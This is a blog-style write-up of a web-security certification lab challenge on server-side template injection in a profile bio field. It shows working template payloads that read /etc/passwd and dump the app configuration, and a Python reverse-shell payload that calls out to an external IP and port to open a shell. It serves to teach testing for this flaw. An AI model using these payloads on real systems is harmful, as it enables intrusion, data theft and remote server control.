---
title: Challenge 13:Reverse Shells Are Not for The Weak
date: 2024-05-14 05:00:00 +0800
categories: [Write-Up, CWAE]
tags: [Cert, Write-Up]     # TAG names should always be lowercase
description: This is a detailed writeup created for challenges associated with the Certified Web AppSecurity Expert (CWAE) certification. 
---

### Challenge/Task

1. SSTI

**Proof-of-Concept (POC):**

Another injection type inside web application is Server-Side Template Injection (SSTI). SSTI is a type of security problem in websites or web applications. Imagine a website as a building made of many parts. One important part is called a "template," which is like a blueprint for how the website should look.

Now, sometimes, attackers can find a way to sneak their own instructions into these templates. It's a bit like someone sneaking a fake floor plan into a real building blueprint. When the website uses this fake plan, it could do things it's not supposed to, like showing secret information or even letting the attacker control parts of the website.

Usually, to test the SSTI we will insert {{}} syntax into these field or parameters. For example, enter {{ 7*7 }} into a bio field below:

![POC-otb](/img/cwae/rsa1.png){: w="400" h="400" }{: .normal }

Surprisingly, the 7*7 which is equal to 49 is reflected in the bio. That’s mean the parameter is vulnerable to SSTI.

How can attacker exploit this vulnerability? Inside {{}} syntax, attacker can put any command that will be executed by the server. First of all, we try to get the list of user by inserting below payload. It works

```jsx
" {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }} "
```

![POC-otb](/img/cwae/rsa2.png){: w="400" h="400" }{: .normal }

Other sensitive info that we can retrieve is also the config by using payload below:
```jsx
" {{config.items()}} "
```

![POC-otb](/img/cwae/rsa3.png){: w="400" h="400" }{: .normal }

We will try to get a reverse shell from this vulnerability. Using below payload, we can get the reverse shell. But first, we have to setup our listener.

![POC-otb](/img/cwae/rsa4.png){: w="400" h="400" }{: .normal }

Then, we can send below payload to the bio input field. 
```jsx
" {{''.__class__.__mro__[1].__subclasses__()[213](['python', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("143.198.205.200",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);']) }} "
```

![POC-otb](/img/cwae/rsa5.png){: w="400" h="400" }{: .normal }

After we click “update” button, our listener is starting to get the connection from the server. We are now inside the victim’s server. To prove it, I run id and whoami command showing that it belongs to the victims. 

![POC-otb](/img/cwae/rsa6.png){: w="400" h="400" }{: .normal }